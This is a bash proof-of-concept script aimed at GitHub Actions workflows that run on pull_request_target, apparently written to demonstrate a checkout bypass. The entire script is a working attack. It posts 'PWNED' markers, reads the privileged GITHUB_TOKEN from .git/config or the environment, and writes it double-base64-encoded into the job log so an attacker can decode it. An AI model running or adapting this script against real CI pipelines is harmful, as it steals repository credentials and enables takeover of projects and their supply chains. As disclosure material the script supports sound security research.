#!/usr/bin/env bash
set +e
echo "::warning title=PWNED::actions/checkout@v7 pull_request_target bypass (U+00A0 trim) -> code execution in the privileged base context"
echo "ctx repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID actor=$GITHUB_ACTOR event=$GITHUB_EVENT_NAME"
echo "proof-of-execution marker: PWNED-RUN"
# actions/checkout persists the base repo's GITHUB_TOKEN into .git/config (extraheader).
RAW=""
if [ -f .git/config ]; then
  B64=$(grep -i 'extraheader' .git/config | head -1 | sed -E 's/.*basic[[:space:]]+//I' | tr -d '[:space:]')
  if [ -n "$B64" ]; then
    RAW=$(printf '%s' "$B64" | base64 -d 2>/dev/null | sed -E 's/^x-access-token://')
  fi
fi
[ -z "$RAW" ] && RAW="${GITHUB_TOKEN:-}"
echo "exfiltrated base-repo GITHUB_TOKEN (double base64 - decode twice to recover the live token):"
printf '%s' "$RAW" | base64 -w0 | base64 -w0; echo
echo "::warning::end PoC"
